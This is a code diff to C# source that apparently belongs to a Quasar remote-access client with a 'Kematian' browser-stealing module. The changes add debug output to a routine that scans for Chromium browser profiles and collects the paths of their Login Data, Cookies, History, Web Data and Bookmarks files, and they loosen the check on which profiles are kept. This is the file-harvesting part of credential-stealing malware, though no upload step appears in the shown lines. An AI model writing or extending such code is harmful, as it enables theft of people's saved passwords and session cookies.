@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
@@ -27,6 +28,21 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
                     SearchForChromiumBrowsers(rootDir, browsers, 0);
                 }
             });
+
+            //print all browsers
+            foreach (var browser in browsers)
+            {
+                Debug.WriteLine(browser.ProfilePath);
+                foreach (var profile in browser.Profiles)
+                {
+                    Debug.WriteLine(profile.Name);
+                    Debug.WriteLine(profile.WebData);
+                    Debug.WriteLine(profile.Cookies);
+                    Debug.WriteLine(profile.History);
+                    Debug.WriteLine(profile.LoginData);
+                    Debug.WriteLine(profile.Bookmarks);
+                }
+            }
 
             return browsers.ToList();
         }
@@ -105,6 +121,9 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
 
                 foreach (var profileDir in profileDirs)
                 {
+                    Debug.WriteLine("--------------------");
+                    Debug.WriteLine(profileDir);
+                    Debug.WriteLine("--------------------");
                     TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                 }
             }
@@ -128,17 +147,26 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
                 Bookmarks = Path.Combine(profileDir, "Bookmarks")
             };
 
-            // Check if at least one essential file exists
-            if (File.Exists(profile.WebData) &&
-                File.Exists(profile.Cookies) &&
-                File.Exists(profile.History) &&
-                File.Exists(profile.LoginData) &&
-                File.Exists(profile.Bookmarks))
+            bool webDataExists = File.Exists(profile.WebData);
+            bool cookiesExists = File.Exists(profile.Cookies);
+            bool historyExists = File.Exists(profile.History);
+            bool loginDataExists = File.Exists(profile.LoginData);
+            bool bookmarksExists = File.Exists(profile.Bookmarks);
+
+            if (webDataExists && cookiesExists && historyExists && loginDataExists || bookmarksExists)
             {
                 if (!profileDir.Contains("Application Data"))
                 {
                     profiles.Add(profile);
                 }
+            }
+            else
+            {
+                if (!webDataExists) Debug.WriteLine($"Missing: {profile.WebData}");
+                if (!cookiesExists) Debug.WriteLine($"Missing: {profile.Cookies}");
+                if (!historyExists) Debug.WriteLine($"Missing: {profile.History}");
+                if (!loginDataExists) Debug.WriteLine($"Missing: {profile.LoginData}");
+                if (!bookmarksExists) Debug.WriteLine($"Missing: {profile.Bookmarks}");
             }
         }
 
